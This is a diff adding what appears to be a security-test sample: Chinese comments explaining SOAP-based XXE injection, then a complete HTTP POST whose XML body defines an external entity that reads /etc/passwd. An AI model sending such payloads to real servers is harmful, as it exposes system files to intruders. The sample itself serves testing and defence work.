@@ -1,0 +1,21 @@
+# XML外部实体注入_SOAP
+# SOAP是一种协议规范，用于在Web上交换结构化和固化的信息。它使用XML格式来编码这些信息，并通过HTTP或HTTPS等协议进行传输。
+# 将exp的XML内容要写在SOAP的前面，服务端在正常解析时就可利用
+POST /?bid=hd_tag_m8mv24ui HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv24ui
+RM-PRO-Token: cab86d8e252c9c7e9704d5d56e5f21ab
+RM-PRO-Time: 1742808414918
+User-Agent: curl/7.83.1
+Content-Type: application/xml
+
+<?xml version="1.0"?>
+<!DOCTYPE order [
+<!ELEMENT foo ANY >
+<!ENTITY xxe SYSTEM "file:///etc/passwd" >
+]>
+<soap:Envelope xmlns:soap="http://www.w3.org/2001/12/soap-envelope" soap:encodingStyle="http://www.w3.org/2001/12/soap-encoding">
+  <soap:Body xmlns:m="http://www.example.org/order">
+     <foo>&xxe;</foo>
+  </soap:Body>
+</soap:Envelope>
